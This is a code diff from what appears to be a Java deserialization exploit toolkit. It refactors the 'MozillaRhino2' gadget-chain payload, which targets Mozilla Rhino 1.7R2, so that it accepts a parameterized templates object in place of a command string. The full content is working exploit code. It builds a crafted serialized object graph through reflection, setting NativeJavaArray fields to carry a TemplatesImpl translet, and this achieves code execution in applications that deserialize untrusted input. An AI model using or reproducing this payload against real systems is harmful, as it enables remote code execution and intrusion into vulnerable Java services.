@@ -49,9 +49,10 @@ import java.util.Map;
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"rhino:js:1.7R2"})
 @Authors({ Authors.TINT0 })
-public class MozillaRhino2 implements ObjectPayload<Object> {
+public class MozillaRhino2 extends ParameterizedTransletObjectPayload<Object> {
 
-    public Object getObject( String command) throws Exception {
+    @Override
+    protected Object getObject(final Object templates) throws Exception {
         ScriptableObject dummyScope = new Environment();
         Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
         associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
@@ -82,7 +83,7 @@ public class MozillaRhino2 implements ObjectPayload<Object> {
 
         NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
         Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
-        Reflections.setFieldValue(nativeJavaArray, "javaObject", Gadgets.createTemplatesImpl(command));
+        Reflections.setFieldValue(nativeJavaArray, "javaObject", templates);
         nativeJavaArray.setPrototype(scriptableObject);
         Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);
 
